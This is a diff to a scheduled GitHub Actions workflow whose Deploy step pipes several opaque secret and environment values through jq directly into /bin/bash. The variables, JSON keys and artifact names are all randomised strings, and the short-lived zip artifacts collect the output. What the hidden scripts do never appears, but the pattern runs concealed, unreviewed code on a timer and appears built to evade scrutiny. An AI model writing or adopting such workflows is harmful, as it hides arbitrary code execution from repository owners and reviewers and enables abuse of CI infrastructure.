@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '27 4,10,16,22 * * *'
+    - cron: '8 5,11,17,23 * * *'
 env:
   CI: true
 concurrency:
@@ -19,16 +19,18 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          xxm4: ${{ secrets.xxm4 }}
+          rgai57: ${{ secrets.rgai57 }}
         run: |
-          printf '%s' "$xxm4" | jq -r .tsf3423 | /bin/bash
-          echo $j5246 | jq -r .knk676 | /bin/bash
-          printf '%s' "$pvpsq6970" | jq -r .h54190 | /bin/bash
-          echo $bao7 | jq -r .emar9 | /bin/bash
+          printf '%s' "$rgai57" | jq -r .kasx5 | /bin/bash
+          echo $wwxcb70 | jq -r .zlmo410 | /bin/bash
+          printf '%s' "$qapms168" | jq -r .p89 | /bin/bash
+          printf '%s' "$cq808" | jq -r .wb54 | /bin/bash
+          echo $z12 | jq -r .pyt4 | /bin/bash
+          printf '%s' "$annq84784" | jq -r .q9419 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: 7HvAXDxB
+          name: YGTQzYy7
           path: "*.zip"
           retention-days: 1
